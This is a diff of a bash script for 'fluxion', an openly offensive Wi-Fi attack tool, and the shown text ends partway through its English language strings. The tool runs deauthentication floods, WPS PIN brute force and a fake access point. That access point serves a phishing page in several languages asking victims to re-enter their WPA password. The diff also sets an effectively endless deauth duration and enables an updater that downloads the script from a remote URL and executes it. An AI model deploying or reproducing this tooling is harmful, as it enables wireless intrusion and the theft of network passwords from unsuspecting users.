@@ -2,7 +2,9 @@
 
 ########## DEBUG Mode ##########
 ##			      ##
-        FLUX_DEBUG=0
+if [ -z ${FLUX_DEBUG+x} ]; then FLUX_DEBUG=0
+else FLUX_DEBUG=1
+fi
 ##			      ##
 ################################
 
@@ -16,13 +18,17 @@ clear
 ##################################### < CONFIGURATION  > #####################################
 # Template directory
 SPECIFIC_WEB_PAGE="./Sites/Template"
-DUMP_PATH="/tmp/TMPflux"                               
+UPDATE_DIR="https://raw.githubusercontent.com/DidyMond/fluxion/master/fluxion"
+DUMP_PATH="/tmp/TMPflux"
 HANDSHAKE_PATH="/root/handshakes"
 PASSLOG_PATH="/root/pwlog"
+WORK_DIR=`pwd`
+ipNmap=`ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'`
 # Deauth duration during handshake capture
-DEAUTHTIME="20"
-version=1.0
-revision=01
+# oo
+DEAUTHTIME="9999999999999"
+revision=52
+version=0.23
 IP=192.168.1.1
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
 
@@ -33,8 +39,26 @@ purple="\033[0;35m"
 red="\033[1;31m"
 green="\033[1;32m"
 yellow="\033[1;33m"
+Purple="\033[0;35m"
+Cyan="\033[0;36m"
+Cafe="\033[0;33m"
+Fiuscha="\033[0;35m"
 blue="\033[1;34m"
 transparent="\e[0m"
+
+
+general_back="Back"
+general_error_1="Not_Found"
+general_case_error="Unknown option. Choose again"
+general_exitmode="Cleaning and closing"
+general_exitmode_1="Disabling monitoring interface"
+general_exitmode_2="Disabling interface"
+general_exitmode_3="Disabling "$grey"forwarding of packets"
+general_exitmode_4="Cleaning "$grey"iptables"
+general_exitmode_5="Restoring "$grey"tput"
+general_exitmode_6="Restarting "$grey"Network-Manager"
+general_exitmode_7="Cleanup performed successfully!"
+general_exitmode_8="Thanks for using fluxion"
 ##############################################################################################
 
 # DEBUG MODE = 0 ; DEBUG MODE = 1 [Normal Mode / Developer Mode]
@@ -50,37 +74,36 @@ fi
 
 # Delete Log only in Normal Mode !
 function conditional_clear() {
-	
+
 	if [[ "$flux_output_device" != "/dev/stdout" ]]; then clear; fi
 }
 
 function airmon {
-	chmod +x airmon 
+	chmod +x airmon
 }
 airmon
 
-# Check Updates 
+# Check Updates
 function checkupdatess {
-	
-    version_online="$(timeout -s SIGTERM 20 curl -L --silent "https://raw.githubusercontent.com/DidyMond/fluxion/master/fluxion" 2>/dev/null | grep "^version" | cut -d "=" -f2)"
+    version_online="$(timeout -s SIGTERM 20 curl -L --silent "$UPDATE_DIR" 2>/dev/null | grep "^version" | cut -d "=" -f2)"
     if [ -z "$version_online" ]; then
 		echo "?">$DUMP_PATH/Iver
 	else
 		echo "$version_online">$DUMP_PATH/Iver
 	fi
     
-	revision_online="$(timeout -s SIGTERM 20 curl -L --silent "https://raw.githubusercontent.com/DidyMond/fluxion/master/fluxion" 2>/dev/null | grep "^revision" | cut -d "=" -f2)"
-	if [ -z "$revision_online" ]; then
+	revision_online="$(timeout -s SIGTERM 20 curl -L --silent "$UPDATE_DIR" 2>/dev/null | grep "^revision" | cut -d "=" -f2)"
+    if [ -z "$revision_online" ]; then
 		echo "?">$DUMP_PATH/Irev
 	else
 		echo "$revision_online">$DUMP_PATH/Irev
 	fi
-	
+
 }
 
-# Animation 
+# Animation
 function spinner {
-	
+
 	local pid=$1
 	local delay=0.15
 	local spinstr='|/-\'
@@ -106,84 +129,90 @@ fi
 #Function to executed in case of unexpected termination
 trap exitmode SIGINT SIGHUP
 
-# KILL ALL 
+# KILL ALL
 function exitmode {
-	
-	echo -e "\n\n"$white"["$red"-"$white"] "$red"Cleaning and closing"$transparent""
-	
+	conditional_clear
+	top
+	echo -e "\n\n"$white"["$red"-"$white"] "$red"$general_exitmode"$transparent""
+
 	if ps -A | grep -q aireplay-ng; then
 		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"aireplay-ng"$transparent""
 		killall aireplay-ng &>$flux_output_device
 	fi
-	
+
 	if ps -A | grep -q airodump-ng; then
 		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"airodump-ng"$transparent""
 		killall airodump-ng &>$flux_output_device
 	fi
-	
+
 	if ps a | grep python| grep fakedns; then
 		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"python"$transparent""
 		kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$flux_output_device
 	fi
-	
+
 	if ps -A | grep -q hostapd; then
 		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"hostapd"$transparent""
 		killall hostapd &>$flux_output_device
 	fi
-	 
+
 	if ps -A | grep -q lighttpd; then
 		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"lighttpd"$transparent""
 		killall lighttpd &>$flux_output_device
 	fi
-	 
+
 	if ps -A | grep -q dhcpd; then
 		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"dhcpd"$transparent""
 		killall dhcpd &>$flux_output_device
 	fi
-	
+
 	if ps -A | grep -q mdk3; then
 		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"mdk3"$transparent""
 		killall mdk3 &>$flux_output_device
 	fi
-	
+
 	if [ "$WIFI_MONITOR" != "" ]; then
-		echo -e ""$weis"["$rot"-"$weis"] "$weis"Disabling monitoring interface "$verde"$WIFI_MONITOR"$transparent""
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_1 "$green"$WIFI_MONITOR"$transparent""
 		./airmon stop $WIFI_MONITOR &> $flux_output_device
 	fi
-	                                                
-       
+
+
 	if [ "$WIFI" != "" ]; then
-		echo -e ""$weis"["$rot"-"$weis"] "$weis"Disabling interface "$verde"$WIFI"$transparent""
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_2 "$green"$WIFI"$transparent""
 		./airmon stop $WIFI &> $flux_output_device
+		macchanger -p $WIFI &> $flux_output_device
 	fi
-	
-	
+
+
 	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
-		echo -e ""$white"["$red"-"$white"] "$white"Disabling "$grey"forwarding of packets"$transparent""
+		echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_3"$transparent""
 		sysctl -w net.ipv4.ip_forward=0 &>$flux_output_device
 	fi
-	
-	echo -e ""$white"["$red"-"$white"] "$white"Cleaning "$grey"iptables"$transparent""
-	iptables --flush 
+
+	echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_4"$transparent""
+	iptables --flush
 	iptables --table nat --flush
 	iptables --delete-chain
 	iptables --table nat --delete-chain
-	
-	echo -e ""$white"["$red"-"$white"] "$white"Restoring "$grey"tput"$transparent""
+
+	echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_5"$transparent""
 	tput cnorm
-	
+
 	if [ $FLUX_DEBUG != 1 ]; then
-		
+
 		echo -e ""$white"["$red"-"$white"] "$white"Delete "$grey"files"$transparent""
 		rm -R $DUMP_PATH/* &>$flux_output_device
 	fi
-	
-	echo -e ""$white"["$red"-"$white"] "$white"Restarting "$grey"Network-Manager"$transparent""
+
+	echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_6"$transparent""
 	service network-manager restart &> $flux_output_device &
 	service networking restart &> $flux_output_device &
-	echo -e ""$white"["$green"+"$white"] "$green"Cleanup performed successfully!"$transparent""
+	service restart networkmanager &> $flux_output_device &
+	echo -e ""$white"["$green"+"$white"] "$green"$general_exitmode_7"$transparent""
+	echo -e ""$white"["$green"+"$white"] "$grey"$general_exitmode_8"$transparent""
+	sleep 2
+	clear
 	exit
-	
+
 }
 
 # Generate a list of web interfaces
@@ -194,17 +223,17 @@ readarray -t webinterfaces < <(echo -e "Web Interface
 # Generate a list of web translations
 readarray -t webinterfaceslenguage < <(echo -e "English [ENG]
 Spanish[ESP] GERMAN [GER]
-\e[1;31mBack"$transparent""
+\e[1;31m$general_back"$transparent""
 )
 
 #Language for Web Interface
 #GER
-DIALOG_WEB_INFO_GER="Aus Sicherheitsgründen, geben sie bitte <b>"$Host_ENC"</b> den WPA2 Schlüssel ein"
+DIALOG_WEB_INFO_GER="Aus Sicherheitsgründen geben sie bitte <b>"$Host_ENC"</b> den WPA2 Schlüssel ein"
 DIALOG_WEB_INPUT_GER="Geben sie den WPA2 Schlüssel ein"
 DIALOG_WEB_SUBMIT_GER="Bestätigen"
 DIALOG_WEB_ERROR_GER="<b><font color=\"red\" size=\"3\">Error</font>:</b> Das eingegebene Passwort ist <b>nicht</b> Korrekt!</b>"
 DIALOG_WEB_OK_GER="Die Verbindung wird in wenigen Sekunden wiederhergestellt"
-DIALOG_WEB_BACK_GER="Back"
+DIALOG_WEB_BACK_GER="$general_back"
 DIALOG_WEB_LENGHT_MIN_GER="Das Passwort muss länger als 7 Zeichen sein"
 DIALOG_WEB_LENGHT_MAX_GER="Das Passwort muss kürzer als 64 Zeichen sein"
 
@@ -214,7 +243,7 @@ DIALOG_WEB_INPUT_ENG="Enter your WPA password:"
 DIALOG_WEB_SUBMIT_ENG="Submit"
 DIALOG_WEB_ERROR_ENG="<b><font color=\"red\" size=\"3\">Error</font>:</b> The entered password is <b>NOT</b> correct!</b>"
 DIALOG_WEB_OK_ENG="Your connection will be restored in a few moments."
-DIALOG_WEB_BACK_ENG="Back"
+DIALOG_WEB_BACK_ENG="$general_back"
 DIALOG_WEB_LENGHT_MIN_ENG="The password must be more than 7 characters"
 DIALOG_WEB_LENGHT_MAX_ENG="The password must be less than 64 characters"
 
@@ -258,9 +287,9 @@ DIALOG_WEB_BACK_POR="Voltar"
 DIALOG_WEB_LENGHT_MIN_POR="A senha deve ter mais de 7 caracteres"
 DIALOG_WEB_LENGHT_MAX_POR="A chave deve ser menor que 64 caracteres"
 
-# Design 
-function mostrarheader(){
-	
+# Design
+function top(){
+
 	conditional_clear
 	echo -e "$blue#########################################################"
 	echo -e "$blue#                                                       #"
@@ -271,6 +300,7 @@ function mostrarheader(){
 	echo -e "$blue#########################################################""$transparent"
 	echo
 	echo
+
 }
 
 ##################################### < END OF CONFIGURATION SECTION > #####################################
@@ -282,9 +312,9 @@ function mostrarheader(){
 
 ############################################## < START > ##############################################
 
-# Check requirements 
+# Check requirements
 function checkdependences {
-	
+
 	echo -ne "Aircrack-ng....."
 	if ! hash aircrack-ng 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
@@ -293,7 +323,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Aireplay-ng....."
 	if ! hash aireplay-ng 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
@@ -302,7 +332,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Airmon-ng......."
 	if ! hash airmon-ng 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
@@ -311,7 +341,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Airodump-ng....."
 	if ! hash airodump-ng 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
@@ -320,7 +350,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Awk............."
 	if ! hash awk 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
@@ -332,14 +362,14 @@ function checkdependences {
 
 	echo -ne "Bully..........."
 	if ! hash bully 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent"" 
+		echo -e "\e[1;31mNot installed"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
-		
-	echo -ne "Curl............"	
+
+	echo -ne "Curl............"
 	if ! hash curl 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
 		exit=1
@@ -347,7 +377,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Dhcpd..........."
 	if ! hash dhcpd 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent" (isc-dhcp-server)"
@@ -356,7 +386,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Hostapd........."
 	if ! hash hostapd 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
@@ -365,7 +395,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Iwconfig........"
 	if ! hash iwconfig 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
@@ -374,7 +404,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Lighttpd........"
 	if ! hash lighttpd 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
@@ -383,7 +413,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Macchanger......"
 	if ! hash macchanger 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
@@ -392,17 +422,17 @@ function checkdependences {
 	    echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Mdk3............"
 	if ! hash mdk3 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
 		exit=1
-		
+
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Nmap............"
 	if ! [ -f /usr/bin/nmap ]; then
 		echo -e "\e[1;31mNot installed"$transparent""
@@ -411,7 +441,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Php5-cgi........"
 	if ! [ -f /usr/bin/php-cgi ]; then
 		echo -e "\e[1;31mNot installed"$transparent""
@@ -420,7 +450,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Pyrit..........."
 	if ! hash pyrit 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
@@ -429,7 +459,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Python.........."
 	if ! hash python 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
@@ -456,7 +486,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Xterm..........."
 	if ! hash xterm 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
@@ -465,7 +495,25 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
-	
+
+	echo -ne "Zenity.........."
+	if ! hash zenity 2>/tmp/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
+	echo -ne "Openssl........."
+	if ! hash openssl 2>/tmp/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
 	echo -ne "rfkill.........."
         if ! hash rfkill 2>/dev/null; then
                 echo -e "\e[1;31mNot installed"$transparent""
@@ -474,15 +522,25 @@ function checkdependences {
                 echo -e "\e[1;32mOK!"$transparent""
         fi
         sleep 0.025
-	
+
+        echo -ne "strings........."
+        if ! hash strings 2>/dev/null; then
+                echo -e "\e[1;31mNot installed"$transparent" (binutils)"
+                exit=1
+        else
+                echo -e "\e[1;32mOK!"$transparent""
+        fi
+        sleep 0.025
+
+
 	if [ "$exit" = "1" ]; then
 	exit 1
 	fi
-	
+
 	sleep 1
 	clear
 }
-mostrarheader
+top
 checkdependences
 
 # Create working directory
@@ -503,16 +561,16 @@ fi
 
 
 if [ $FLUX_DEBUG != 1 ]; then
-	
-	echo "" 
-	sleep 0.1 && echo -e $red "O))))))))O))      O))     O))O))      O))O))    O))))     O)))     O))"
-	sleep 0.1 && echo -e $red "O))      O))      O))     O)) O))   O))  O))  O))    O))  O) O))   O))"
-	sleep 0.1 && echo -e $red "O))      O))      O))     O))  O)) O))   O))O))        O))O)) O))  O))"
-	sleep 0.1 && echo -e $red "O))))))  O))      O))     O))    O))     O))O))        O))O))  O)) O))"
-	sleep 0.1 && echo -e $red "O))      O))      O))     O))  O)) O))   O))O))        O))O))   O) O))"
-	sleep 0.1 && echo -e $red "O))      O))      O))     O)) O))   O))  O))  O))     O)) O))    O) ))"
-	sleep 0.1 && echo -e $red "O))      O))))))))  O)))))   O))      O))O))    O))))     O))      O))"
 	echo ""
+		   sleep 0.1 && echo -e "$red "                                                                                                                                       
+           sleep 0.1 && echo -e "         ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐    "
+           sleep 0.1 && echo -e "         ║▒_     │▒║     │▒║ ║▒    \▒\/▒/    │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║    "                
+           sleep 0.1 && echo -e "         ≡◙◙     ║◙║     ║◙║ ║◙      ◙◙      ║¤▒   ║▓║☯║▓   ♜◙\✪\◙♜    "
+           sleep 0.1 && echo -e "         ║▒      │▒║__   │▒└_┘▒    /▒/\▒\    │☢╫   │▒└╧┘▒   ║█ \▒█║    "                       
+           sleep 0.1 && echo -e "         ⌡▓      ⌡◘▒▓▒   ⌡◘▒▓▒◘   └▓/  \▓┘   ⌡▓╝   ⌡◙▒▓▒◙   ⌡▓  \▓┘    "
+           sleep 0.1 && echo -e "        ¯¯¯     ¯¯¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯    ¯¯¯ ¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯¯¯¯¯¯  "
+
+	echo""
 	
 	sleep 1
 	echo -e $red"                     FLUX "$white""$version" (rev. "$green "$revision"$white") "$yellow"by "$white" deltax"
@@ -525,51 +583,34 @@ if [ $FLUX_DEBUG != 1 ]; then
 	tput civis
 	checkupdatess &
 	spinner "$!"
-    version_online=$(cat $DUMP_PATH/Iver)
+    	version_online=$(cat $DUMP_PATH/Iver)
 	revision_online=$(cat $DUMP_PATH/Irev)
 	echo -e ""$white" [${purple}${version_online}$white"$transparent"]"
-    echo -n "                              Latest rev."
-    echo -e ""$white" [${purple}${revision_online}$white"$transparent"]"
-#		if [ "$revision_online" != "?" ]; then
-#			
-#			if [ "$revision" != "$revision_online" ]; then
-#				
-#				cp $0 $HOME/flux_rev-$revision.backup
-#				curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:11.0) Gecko/20100101 Firefox/11.0" -L https://sites.google.com/site/deltaxflux/fluxion -s -o $0
-#				echo
-#				echo
-#				echo -e ""$red"
-#Updated successfully! Restarting the script to apply the changes ..."$transparent""
-#				sleep 5
-#				chmod +x $0
-#				exec $0
-#				
-#			fi
-#		fi
+	echo -n "                              Latest rev."
+	echo -e ""$white" [${purple}${revision_online}$white"$transparent"]"
+		if [[ "$revision_online" != "?" ]]; then
+
+			if [[ "$version_online" > "$version" ]] || [[ "$version_online" == "$version" && "$revision_online" > "$revision" ]] ; then
+				cp $0 $WORK_DIR/flux_rev-$version-$revision.backup
+				curl "$UPDATE_DIR" -s -o $0
+				echo
+				echo
+				echo -e ""$red"
+				Updated successfully! Restarting the script to apply the changes ..."$transparent""
+				sleep 3
+				chmod +x $0
+				exec $0
+			fi
+		fi
 	echo ""
 	tput cnorm
 	sleep 2
-	
-fi
-
-function tools {
-	declare tools=tools/
-	if [ -d $tools ]; then
-
-	mostrarheader
-	conditional_clear
-	rm -f tools.zip
-	wget https://sites.google.com/site/deltaxflux/tools.zip
-	unzip tools.zip 
-	rm -f tools.zip
 
 fi
-}
-tools
 
 # Show info for the selected AP
 function infoap {
-	
+
 	Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
 	Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | cut -d " " -f 5-`
 	echo "INFO WIFI"
@@ -577,7 +618,7 @@ function infoap {
 	echo -e "               "$blue"SSID"$transparent" = $Host_SSID / $Host_ENC"
 	echo -e "               "$blue"Channel"$transparent" = $channel"
 	echo -e "               "$blue"Speed"$transparent" = ${speed:2} Mbps"
-	echo -e "               "$blue"BSSID"$transparent" = $mac (\e[1;33m$Host_MAC_MODEL"$transparent")"
+	echo -e "               "$blue"BSSID"$transparent" = $mac (\e[1;33m$Host_MAC_MODEL $transparent)"
 	echo
 }
 
@@ -594,7 +635,7 @@ function infoap {
 function setresolution {
 
 	function resA {
-		
+
 		TOPLEFT="-geometry 90x13+0+0"
 		TOPRIGHT="-geometry 83x26-0+0"
 		BOTTOMLEFT="-geometry 90x24+0-0"
@@ -602,9 +643,9 @@ function setresolution {
 		TOPLEFTBIG="-geometry 91x42+0+0"
 		TOPRIGHTBIG="-geometry 83x26-0+0"
 	}
-	
+
 	function resB {
-		
+
 		TOPLEFT="-geometry 92x14+0+0"
 		TOPRIGHT="-geometry 68x25-0+0"
 		BOTTOMLEFT="-geometry 92x36+0-0"
@@ -613,7 +654,7 @@ function setresolution {
 		TOPRIGHTBIG="-geometry 74x30-0+0"
 	}
 	function resC {
-		
+
 		TOPLEFT="-geometry 100x20+0+0"
 		TOPRIGHT="-geometry 109x20-0+0"
 		BOTTOMLEFT="-geometry 100x30+0-0"
@@ -641,9 +682,9 @@ function setresolution {
 		TOPLEFT="-geometry 100x17+0+0"
 		TOPRIGHT="-geometry 90x27-0+0"
 		BOTTOMLEFT="-geometry 100x30+0-0"
-		BOTTOMRIGHT="-geometry 90x20-0-0" 
-		TOPLEFTBIG="-geometry  100x70+0+0" 
-		TOPRIGHTBIG="-geometry 90x27-0+0"  
+		BOTTOMRIGHT="-geometry 90x20-0-0"
+		TOPLEFTBIG="-geometry  100x70+0+0"
+		TOPRIGHTBIG="-geometry 90x27-0+0"
 }
 
 detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
@@ -660,121 +701,474 @@ case $detectedresolution in
 	"1280x1024" ) resD ;;
 	"1600x1200" ) resE ;;
 	"1366x768"  ) resF ;;
-		  * ) resA ;; 
+		  * ) resA ;;
 esac
+
+language
 }
 
+function language {
+
+	conditional_clear
+
+	while true; do
+		conditional_clear
+		top
+
+		echo "Select your language"
+		echo "                                       "
+		echo -e "      "$blue"1)"$transparent" German          "
+		echo -e "      "$blue"2)"$transparent" English      "
+		echo -e "      "$blue"3)"$transparent" Romanian     "
+		echo -e "      "$blue"4)"$transparent" Turkish    "
+		echo -e "      "$blue"5)"$transparent" Spanish    "
+		echo -e "      "$blue"6)"$transparent" Chinese   "
+		echo "                                       "
+		echo -n "      #> "
+		read yn
+		echo ""
+		case $yn in
+			1 ) german; break ;;
+			2 ) english; break ;;
+			3 ) romanian; break;;
+			4 ) turkish; break;;
+			5 ) spain; break;;
+			6 ) chinese; break;;
+			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
+		  esac
+	done
+}
+
+function german { 
+	header_setinterface="Wähle deine Netzwerk Karte"
+	setinterface_error="Es wurden keine Netzwerk Karten gefunden, beende..."
+
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_choosescan="Wähle dein Kanal"
+
+	choosescan_option_1="Alle Kanäle"
+	choosescan_option_2="Spezifische Kanal(e)"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	scanchan_option_1="Einzelner Kanal"
+	scanchan_option_2="Mehrere Kanäle"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_scan="WIFI Monitor"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_scanchan="Scane Netwerke..."
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_askAP="Wähle deine Angriffs Methode"
+	askAP_option_1="FakeAP - Hostapd ("$red"Empfohlen)"
+	askAP_option_2="FakeAP - airbase-ng (Langsame Verbindung)"
+	askAP_option_3="WPS-SLAUGHTER - Bruteforce WPS Pin"
+	askAP_option_4="Bruteforce - (Handshake wird benötigt)"
+	general_back="Zurück"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_askauth="Methode um den Handshake zu Prüfen"
+	askauth_option_1="Handshake ("$red"Empfohlen)"
+	askauth_option_2="Wpa_supplicant(Mehrere Ausfälle)"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_deauthforce="Handshake überprüfung"
+	deauthforce_option_1="aircrack-ng (Ausfall möglich)"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_deauthMENU="*Erfassung des Handshake*"
+	deauthMENU_option_1="Überprüfe handshake"
+	deauthMENU_option_2="Starte neu"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_webinterface="Wähle deine Strategie"
+	header_ConnectionRESET="Wähle deine login Seite"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	general_case_error="Unbekannte Option, wähle neu"
+	general_error_1="Nicht gefunden"
+	general_error_2="Datei wurde ${red}nicht$transparent gefunden"
+	general_back="Zurück"
+	general_exitmode="Aufräumen und schließen"
+	general_exitmode_1="Deaktivierung des Monitor Interface"
+	general_exitmode_2="Deaktivierung des Interface"
+	general_exitmode_3="Deaktivierung "$grey"von weiterleiten von Paketen"
+	general_exitmode_4="Säubere "$grey"iptables"
+	general_exitmode_5="Wiederherstellung von"$grey"tput"
+	general_exitmode_6="Neustarten des "$grey"Netzwerk Manager"
+	general_exitmode_7="Wiederherstellung war erfolgreich"
+	general_exitmode_8="Vielen Dank für das nutzen von Fluxion"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	selection_1="Mit aktive Nutzer"
+	selection_2="Wähle dein Angriffsziel. Um neuzuscannen tippe $red r$transparent"
+	setinterface
+}
+
+function english {
+	header_setinterface="Select an interface"
+	setinterface_error="There are no wireless cards, quit..."
+
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_choosescan="Select channel"
+	choosescan_option_1="All channels "
+	choosescan_option_2="Specific channel(s)"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	scanchan_option_1="Single channel"
+	scanchan_option_2="Multiple channels"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_scan="WIFI Monitor"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_scanchan="Scanning Target"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_askAP="Select Attack Option"
+	askAP_option_1="FakeAP - Hostapd ("$red"Recommended)"
+	askAP_option_2="FakeAP - airbase-ng (Slower connection)"
+	askAP_option_3="WPS-SLAUGHTER - Bruteforce WPS Pin"
+	askAP_option_4="Bruteforce - (Handshake is required)"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_askauth="METHOD TO VERIFY THE PASSWORD"
+	askauth_option_1="Handshake ("$red"Recommended)"
+	askauth_option_2="Wpa_supplicant(More failures)"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_deauthforce="Handshake check"
+	deauthforce_option_1="aircrack-ng (Miss chance)"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_deauthMENU="*Capture Handshake*"
+	deauthMENU_option_1="Check handshake"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_webinterface="Select your option"
+	header_ConnectionRESET="Select Login Page"
